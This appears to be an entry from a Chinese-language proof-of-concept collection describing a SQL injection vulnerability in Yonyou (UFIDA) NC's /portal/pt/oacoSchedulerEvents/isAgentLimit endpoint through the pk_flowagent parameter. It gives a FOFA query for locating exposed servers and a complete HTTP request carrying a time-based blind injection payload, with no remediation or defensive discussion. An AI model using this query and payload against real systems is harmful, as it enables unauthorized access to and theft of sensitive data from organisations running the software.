## 用友NC-oacoSchedulerEvents接口存在sql注入漏洞

用友NC存在SQL注入漏洞，该漏洞源于/portal/pt/oacoSchedulerEvents/isAgentLimit接口中的pk_flowagent参数存在sql注入漏洞，攻击者可通过该漏洞获取数据库敏感数据。

## fofa

```
app="用友-UFIDA-NC"
```

## poc

```
GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:5'-- HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

